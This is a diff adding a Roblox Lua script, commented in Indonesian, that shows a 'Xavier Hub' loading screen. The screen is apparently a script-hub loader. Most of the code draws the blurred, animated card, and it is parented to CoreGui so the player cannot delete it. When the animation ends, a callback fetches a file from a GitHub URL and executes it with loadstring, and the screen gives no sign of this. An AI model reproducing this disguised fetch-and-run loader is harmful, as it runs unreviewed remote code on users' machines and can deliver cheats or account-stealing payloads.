@@ -1,0 +1,350 @@
+-- Xavier Hub Fake Loading UI
+-- LocalScript - Taruh di StarterPlayerScripts atau StarterGui
+-- Menggunakan CoreGui agar tidak bisa di-delete player
+
+local Players      = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui      = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+
+-- ==========================================
+-- KONFIGURASI (Edit sesuai kebutuhan)
+-- ==========================================
+local CONFIG = {
+    UI_HIDE_WAIT    = 6,       -- Detik sebelum UI hilang
+    SOUND_STOP_WAIT = 5,       -- Detik sebelum sound mati
+    IMAGE_ID  = "rbxassetid://6597236813",  -- <-- GANTI IMAGE ID
+    SOUND_ID  = "rbxassetid://91117284777728",  -- <-- GANTI SOUND ID
+    LOADING_TEXT  = "Loading....",
+    TITLE_TEXT_1  = "Xavier",
+    TITLE_TEXT_2  = "Hub",
+}
+
+-- ==========================================
+-- CALLBACK KETIKA SELESAI
+-- ==========================================
+local function OnLoadingFinished()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mousegay570-source/potential-fiesta/refs/heads/main/NoTezt"))()
+
+    print("Xavier Hub: finish load")
+    
+end
+
+-- ==========================================
+-- SCREENGUI → COREGUI
+-- ==========================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name           = "XavierHubLoader"
+ScreenGui.ResetOnSpawn   = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder   = 9999
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent         = CoreGui
+
+-- ==========================================
+-- LATAR BELAKANG: PUTIH TRANSPARAN + BLUR
+-- ==========================================
+
+-- BlurEffect pada kamera (efek buram seluruh layar)
+local BlurEffect = Instance.new("BlurEffect")
+BlurEffect.Name  = "XavierBlur"
+BlurEffect.Size  = 20   -- intensitas buram (0–56)
+BlurEffect.Parent = game:GetService("Lighting")
+
+-- Overlay putih transparan tipis di atas blur
+local Background = Instance.new("Frame")
+Background.Name                   = "Background"
+Background.Size                   = UDim2.new(1, 0, 1, 0)
+Background.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
+Background.BackgroundTransparency = 0.55   -- putih transparan dikit
+Background.BorderSizePixel        = 0
+Background.ZIndex                 = 1
+Background.Parent                 = ScreenGui
+
+-- ==========================================
+-- CARD HITAM (tengah layar)
+-- ==========================================
+local MainFrame = Instance.new("Frame")
+MainFrame.Name                   = "MainFrame"
+MainFrame.Size                   = UDim2.new(0, 0, 0, 0)   -- mulai 0, tween membesar
+MainFrame.Position               = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.AnchorPoint            = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3       = Color3.fromRGB(0, 0, 0)
+MainFrame.BackgroundTransparency = 0
+MainFrame.BorderSizePixel        = 0
+MainFrame.ClipsDescendants       = true
+MainFrame.ZIndex                 = 10
+MainFrame.Parent                 = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 18)
+MainCorner.Parent       = MainFrame
+
+-- Border ungu
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color        = Color3.fromRGB(110, 55, 200)
+MainStroke.Thickness    = 1.8
+MainStroke.Transparency = 0.28
+MainStroke.Parent       = MainFrame
+
+-- Glow ungu di balik card
+local GlowFrame = Instance.new("Frame")
+GlowFrame.Size                   = UDim2.new(1, 32, 1, 32)
+GlowFrame.Position               = UDim2.new(0, -16, 0, -16)
+GlowFrame.BackgroundColor3       = Color3.fromRGB(90, 40, 185)
+GlowFrame.BackgroundTransparency = 0.82
+GlowFrame.BorderSizePixel        = 0
+GlowFrame.ZIndex                 = 9
+GlowFrame.Parent                 = MainFrame
+
+local GlowCorner = Instance.new("UICorner")
+GlowCorner.CornerRadius = UDim.new(0, 28)
+GlowCorner.Parent       = GlowFrame
+
+-- ==========================================
+-- KONTEN CARD
+-- ==========================================
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Size                   = UDim2.new(1, 0, 1, 0)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.ZIndex                 = 11
+ContentFrame.Parent                 = MainFrame
+
+local ContentLayout = Instance.new("UIListLayout")
+ContentLayout.FillDirection       = Enum.FillDirection.Vertical
+ContentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+ContentLayout.VerticalAlignment   = Enum.VerticalAlignment.Center
+ContentLayout.Padding             = UDim.new(0, 8)
+ContentLayout.Parent              = ContentFrame
+
+local ContentPadding = Instance.new("UIPadding")
+ContentPadding.PaddingLeft   = UDim.new(0, 22)
+ContentPadding.PaddingRight  = UDim.new(0, 22)
+ContentPadding.PaddingTop    = UDim.new(0, 22)
+ContentPadding.PaddingBottom = UDim.new(0, 22)
+ContentPadding.Parent        = ContentFrame
+
+-- Title "Xavier  Hub"
+local TitleFrame = Instance.new("Frame")
+TitleFrame.Size                   = UDim2.new(1, 0, 0, 52)
+TitleFrame.BackgroundTransparency = 1
+TitleFrame.ZIndex                 = 12
+TitleFrame.Parent                 = ContentFrame
+
+local TitleLayout = Instance.new("UIListLayout")
+TitleLayout.FillDirection       = Enum.FillDirection.Horizontal
+TitleLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+TitleLayout.VerticalAlignment   = Enum.VerticalAlignment.Center
+TitleLayout.Padding             = UDim.new(0, 10)
+TitleLayout.Parent              = TitleFrame
+
+local XavierLabel = Instance.new("TextLabel")
+XavierLabel.Size                   = UDim2.new(0, 0, 1, 0)
+XavierLabel.AutomaticSize          = Enum.AutomaticSize.X
+XavierLabel.BackgroundTransparency = 1
+XavierLabel.Text                   = CONFIG.TITLE_TEXT_1
+XavierLabel.TextColor3             = Color3.fromRGB(130, 80, 230)
+XavierLabel.TextSize               = 36
+XavierLabel.Font                   = Enum.Font.GothamBold
+XavierLabel.ZIndex                 = 13
+XavierLabel.Parent                 = TitleFrame
+
+local HubLabel = Instance.new("TextLabel")
+HubLabel.Size                   = UDim2.new(0, 0, 1, 0)
+HubLabel.AutomaticSize          = Enum.AutomaticSize.X
+HubLabel.BackgroundTransparency = 1
+HubLabel.Text                   = CONFIG.TITLE_TEXT_2
+HubLabel.TextColor3             = Color3.fromRGB(130, 80, 230)
+HubLabel.TextSize               = 36
+HubLabel.Font                   = Enum.Font.GothamBold
+HubLabel.ZIndex                 = 13
+HubLabel.Parent                 = TitleFrame
+
+-- Divider
+local Divider = Instance.new("Frame")
+Divider.Size                   = UDim2.new(0.75, 0, 0, 1)
+Divider.BackgroundColor3       = Color3.fromRGB(110, 55, 200)
+Divider.BackgroundTransparency = 0.32
+Divider.BorderSizePixel        = 0
+Divider.ZIndex                 = 12
+Divider.Parent                 = ContentFrame
+
+-- "Loading...."
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size                   = UDim2.new(1, 0, 0, 34)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text                   = CONFIG.LOADING_TEXT
+LoadingLabel.TextColor3             = Color3.fromRGB(255, 255, 255)
+LoadingLabel.TextSize               = 22
+LoadingLabel.Font                   = Enum.Font.GothamBold
+LoadingLabel.TextXAlignment         = Enum.TextXAlignment.Center
+LoadingLabel.ZIndex                 = 12
+LoadingLabel.Parent                 = ContentFrame
+
+-- "Please wait"
+local PleaseWaitLabel = Instance.new("TextLabel")
+PleaseWaitLabel.Size                   = UDim2.new(1, 0, 0, 22)
+PleaseWaitLabel.BackgroundTransparency = 1
+PleaseWaitLabel.Text                   = "Please wait"
+PleaseWaitLabel.TextColor3             = Color3.fromRGB(210, 210, 210)
+PleaseWaitLabel.TextSize               = 15
+PleaseWaitLabel.Font                   = Enum.Font.Gotham
+PleaseWaitLabel.TextXAlignment         = Enum.TextXAlignment.Center
+PleaseWaitLabel.ZIndex                 = 12
+PleaseWaitLabel.Parent                 = ContentFrame
+
+-- Image
+local ImageLabel = Instance.new("ImageLabel")
+ImageLabel.Size                   = UDim2.new(0, 90, 0, 70)
+ImageLabel.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 0
+ImageLabel.Image                  = CONFIG.IMAGE_ID
+ImageLabel.ScaleType              = Enum.ScaleType.Fit
+ImageLabel.ZIndex                 = 12
+ImageLabel.Parent                 = ContentFrame
+
+local ImageCorner = Instance.new("UICorner")
+ImageCorner.CornerRadius = UDim.new(0, 5)
+ImageCorner.Parent       = ImageLabel
+
+-- Dots animasi
+local DotsFrame = Instance.new("Frame")
+DotsFrame.Size                   = UDim2.new(0, 60, 0, 10)
+DotsFrame.BackgroundTransparency = 1
+DotsFrame.ZIndex                 = 12
+DotsFrame.Parent                 = ContentFrame
+
+local DotsLayout = Instance.new("UIListLayout")
+DotsLayout.FillDirection       = Enum.FillDirection.Horizontal
+DotsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+DotsLayout.VerticalAlignment   = Enum.VerticalAlignment.Center
+DotsLayout.Padding             = UDim.new(0, 7)
+DotsLayout.Parent              = DotsFrame
+
+local dots = {}
+for i = 1, 3 do
+    local dot = Instance.new("Frame")
+    dot.Size                   = UDim2.new(0, 6, 0, 6)
+    dot.BackgroundColor3       = Color3.fromRGB(130, 80, 230)
+    dot.BackgroundTransparency = 0.3
+    dot.BorderSizePixel        = 0
+    dot.ZIndex                 = 13
+    dot.Parent                 = DotsFrame
+    local dc = Instance.new("UICorner")
+    dc.CornerRadius = UDim.new(1, 0)
+    dc.Parent       = dot
+    table.insert(dots, dot)
+end
+
+-- ==========================================
+-- SOUND
+-- ==========================================
+local Sound = Instance.new("Sound")
+Sound.Name    = "XavierSound"
+Sound.SoundId = CONFIG.SOUND_ID
+Sound.Volume  = 0.7
+Sound.Looped  = true
+Sound.Parent  = ScreenGui
+
+-- ==========================================
+-- ANIMASI DOTS & LOADING TEXT
+-- ==========================================
+local dotAnimActive     = true
+local loadingAnimActive = true
+
+task.spawn(function()
+    local idx = 1
+    while dotAnimActive do
+        for i, d in ipairs(dots) do
+            TweenService:Create(d, TweenInfo.new(0.15), {
+                BackgroundTransparency = (i == idx) and 0 or 0.68,
+                Size = (i == idx) and UDim2.new(0, 9, 0, 9) or UDim2.new(0, 5, 0, 5),
+            }):Play()
+        end
+        idx = (idx % #dots) + 1
+        task.wait(0.32)
+    end
+end)
+
+task.spawn(function()
+    while loadingAnimActive do
+        TweenService:Create(LoadingLabel, TweenInfo.new(0.85, Enum.EasingStyle.Sine), {
+            TextTransparency = 0.82
+        }):Play()
+        task.wait(0.90)
+        TweenService:Create(LoadingLabel, TweenInfo.new(0.85, Enum.EasingStyle.Sine), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.90)
+    end
+end)
+
+-- Glow pulse
+task.spawn(function()
+    while true do
+        TweenService:Create(GlowFrame, TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            BackgroundTransparency = 0.72
+        }):Play()
+        task.wait(1.6)
+        TweenService:Create(GlowFrame, TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            BackgroundTransparency = 0.90
+        }):Play()
+        task.wait(1.6)
+    end
+end)
+
+-- ==========================================
+-- INTRO: blur muncul + card membesar
+-- ==========================================
+-- Blur mulai dari 0, naik ke 20
+BlurEffect.Size = 0
+TweenService:Create(BlurEffect, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {
+    Size = 20
+}):Play()
+
+Sound:Play()
+TweenService:Create(MainFrame, TweenInfo.new(0.48, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0, 315, 0, 298)
+}):Play()
+
+-- ==========================================
+-- TIMER SOUND: fade out & stop
+-- ==========================================
+task.delay(CONFIG.SOUND_STOP_WAIT, function()
+    TweenService:Create(Sound, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {
+        Volume = 0
+    }):Play()
+    task.wait(1.25)
+    Sound:Stop()
+end)
+
+-- ==========================================
+-- TIMER UI: mengecil & hilang + blur off
+-- ==========================================
+task.delay(CONFIG.UI_HIDE_WAIT, function()
+    dotAnimActive     = false
+    loadingAnimActive = false
+
+    -- Card mengecil
+    local outroCard = TweenService:Create(MainFrame,
+        TweenInfo.new(0.38, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0)
+    })
+    outroCard:Play()
+
+    -- Background & blur fade out
+    TweenService:Create(Background, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {
+        BackgroundTransparency = 1
+    }):Play()
+    TweenService:Create(BlurEffect, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {
+        Size = 0
+    }):Play()
+
+    outroCard.Completed:Connect(function()
+        BlurEffect:Destroy()
+        ScreenGui:Destroy()
+        OnLoadingFinished()
+    end)
+end)
